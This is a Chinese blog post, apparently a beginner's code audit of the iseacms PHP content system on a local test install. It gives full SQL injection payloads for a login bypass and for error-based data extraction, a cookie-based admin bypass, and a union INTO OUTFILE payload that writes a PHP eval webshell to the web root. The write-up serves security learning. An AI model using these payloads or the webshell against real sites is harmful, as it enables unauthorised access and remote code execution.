---
title: iseacms简单审计
date: 2020-12-13 10:37:04
categories: PHP代码审计
---

<!-- TOC -->

- [0x00 前言](#0x00-前言)
- [0x01 开庭](#0x01-开庭)
- [0x02 文件包含(LFI)](#0x02-文件包含lfi)
- [0x03 登陆sql注入](#0x03-登陆sql注入)
- [0x04 越权？](#0x04-越权)
- [0x05 getshell](#0x05-getshell)
- [0x06 最后](#0x06-最后)

<!-- /TOC -->
<!--more-->

# 0x00 前言
第一次审计cms，粗糙了些，webU•ェ•*U的究极还是代码审计吧，先从简单的开始

# 0x01 开庭
从网上下载iseacms在本地搭建好，先用seay审计工具来一波
![seay](https://raw.githubusercontent.com/yq1ng/blog/master/iseacms%E5%AE%A1%E8%AE%A1/image.2s24klx69bs.png)

# 0x02 文件包含(LFI)
第一个就是典型的LFI，本地写个phpinfo试试，可以
![LFI](https://raw.githubusercontent.com/yq1ng/blog/master/iseacms%E5%AE%A1%E8%AE%A1/image.jn3grvn7tun.png)
似乎审计工具报的漏洞就这一个能用。。。

# 0x03 登陆sql注入
翻翻admin\
进后台登陆界面，login.php先判断是否存在这个用户，在判断输入的密码的md5与数据库是否一致
- 万能密码
  ctf里面也考过这个，通过联合查询控制我们想要的pass，上图
  ![pass](https://raw.githubusercontent.com/yq1ng/blog/master/iseacms%E5%AE%A1%E8%AE%A1/image.dcijm3ka6dp.png)
  先查询一个不存在的用户，在联合一个admin，控制pass进行登录，payload：user: `yq1ng'union select 1,2,'admin','c4ca4238a0b923820dcc509a6f75849b',5,6,7,8#`,pass:`1`\
  user那一串是1的md5
- 报错注入
  源码没有屏蔽mysql的报错，而是将其输出，试试报错注入
  user: `yq1ng'or updatexml(1,concat("~",(select database()),"~"),1)#`, pass随意，即可爆出数据库名\
  注意：报错回显最多32位，查pass需要截取

# 0x04 越权？
登陆成功有个`setcookie`，或许检查存在cookie后就进入后台了？全局搜搜cookie
![cookie](https://raw.githubusercontent.com/yq1ng/blog/master/iseacms%E5%AE%A1%E8%AE%A1/image.sguhqtqpba.png)
只要cookie不为空即可登陆，好耶，直接增加cookie：`user:admin`值随意，url为`http://127.0.0.1/iseacms/admin/?r=index`直接进了后台

# 0x05 getshell
利用登陆页面的报错得知MySQL的安装路径，例如本机为`D:\Software\phpstudy_pro\Extensions\MySQL8.0.12`得知是PHP study搭建的网站，所以猜测网站路径为`D:\Software\phpstudy_pro\WWW\iseacms`，写马，开始用报错写不进去，经M3师傅点醒，联合注入写马，payload：`login=yes&password=1&user=yq1ng' union select 1,"admin",1,1,1,1,1,'<?php @eval($_POST["yq1ng"]);?>' into outfile 'D:\\phpstudy_pro\\WWW\\shell.php'#`虽然会报错，但是马儿还是写进去了
![getshell](https://raw.githubusercontent.com/yq1ng/blog/master/iseacms%E5%AE%A1%E8%AE%A1/image.sn0w678ruu.png)

# 0x06 最后
菜鸡止步于此，本来想试试xss，结果提交后跳到其他地方了，我也懒得改源码了，总的来说审cms挺有意思的，虽然这个比较简单吧，难的就劝退了嘤嘤嘤